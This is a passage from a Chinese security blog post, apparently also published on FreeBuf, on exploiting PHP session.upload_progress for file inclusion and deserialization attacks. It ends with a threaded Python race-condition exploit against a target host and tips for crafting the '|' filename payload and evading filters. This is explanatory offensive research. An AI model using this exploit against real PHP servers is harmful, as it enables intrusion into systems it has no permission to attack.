   <span class="keyword">if</span> len(resp.text)&lt;<span class="number">2000</span>:</span><br><span class="line">            print(<span class="string">'[+++++]retry'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(resp.content.decode(<span class="string">'utf-8'</span>).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            et.clear()</span><br><span class="line">            print(<span class="string">'success!'</span>)</span><br><span class="line">            </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    port=int(sys.argv[<span class="number">2</span>])</span><br><span class="line">    et=threading.Event()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">        threading.Thread(target=exp,args=(ip,port)).start()</span><br><span class="line">    et.set()</span><br></pre></td></tr></table></figure>
+<p>首先在代码里加个代理，利用burp抓包。如下图</p>
+<p><a href="https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190506/1557146875_5cd02cfb01b9e.png%21small" alt="利用session.upload_progress进行文件包含和反序列化渗透"></a></p>
+<p>这里有几个注意点：</p>
+<blockquote>
+<p>PHPSESSID必须要有，因为要竞争同一个文件</p>
+<p>filename可控，但是在值的最前面加上<code>|</code>,因为最终目的是利用session的反序列化，<code>PHP_SESSION_UPLOAD_PROGRESS</code>只是个跳板。其次把字符串中的双引号转义，以防止与最外层的双引号冲突</p>
+<p>上传的文件要大些，否则很难竞争成功。我写入是这么大<code>f = io.BytesIO(b&#39;a&#39; * 1024 *1024*1)</code></p>
+<p>filename值中出现汉字时，会出错，所以在利用脚本前，<a href="https://blog.csdn.net/iriszx999/article/details/82113521" target="_blank" rel="noopener">一定要修改python源码</a></p>
+</blockquote>
+<p>最后把<code>exp.py</code>中的代理去掉，直接跑<code>exp.py</code>,效果如下。</p>
+<p><a href="https://image.3001.net/images/20190506/1557146899_5cd02d139da64.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20190506/1557146899_5cd02d139da64.png%21small" alt="利用session.upload_progress进行文件包含和反序列化渗透"></a></p>
+<h3 id="几次失败尝试"><a href="#几次失败尝试" class="headerlink" title="几次失败尝试"></a>几次失败尝试</h3><blockquote>
+<p>其实，利用burp抓到<code>exp.py</code>流量后，可以直接在burp爆破，但貌似数据包数据有点多，导致burp反应很慢，最终失败。</p>
+<p>另外，我尝试伪造<code>PHP_SESSION_UPLOAD_PROGRESS</code>的值，但是值中一旦出现<code>|</code>，将会导致数据写入session文件失败。</p>
+</blockquote>
+<h3 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h3><p>利用条件主要是存在session反序列化漏洞。</p>
+<p>从文件包含和反序列化两个利用点，可以发现，利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>可以绕过大部分过滤，而且传输的数据也不易发现。</p>
+<p>文章首发于freebuf。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/29/python文件操作/" rel="next" title="python文件操作">
+                <i class="fa fa-chevron-left"></i> python文件操作
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="TGAO">
+            
+              <p class="site-author-name" itemprop="name">TGAO</p>
+              <p class="site-description motion-element" itemprop="description">To Go All Out</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友链
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://laworigin.github.io/" title="WisdomTree" target="_blank">WisdomTree</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cryscat.com" title="Crycat" target="_blank">Crycat</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.lc4t.me/#blog" title="lc4t" target="_blank">lc4t</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://magicbluech.github.io/" title="MagicBlue" target="_blank">MagicBlue</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://otakekumi.github.io/" title="梅子酒" target="_blank">梅子酒</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://0clickjacking0.github.io" title="如果人生可以Ctrl+Z" target="_blank">如果人生可以Ctrl+Z</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php中的session-upload-progress"><span class="nav-text">php中的session.upload_progress</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#session相关配置及session反序列化"><span class="nav-text">session相关配置及session反序列化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用session-upload-progress进行文件包含利用"><span class="nav-text">利用session.upload_progress进行文件包含利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#示例代码"><span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用脚本"><span class="nav-text">利用脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctf题目"><span class="nav-text">ctf题目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结"><span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用session-upload-progress进行反序列化攻击"><span class="nav-text">利用session.upload_progress进行反序列化攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境-1"><span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#示例代码-1"><span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#分析-1"><span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用脚本-1"><span class="nav-text">利用脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#几次失败尝试"><span class="nav-text">几次失败尝试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#小结-1"><span class="nav-text">小结</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TGAO</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+  <script type="text/javascript" color="0,0,240" opacity="0.7" zindex="-2" count="40" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+  
+</body>
+</html>
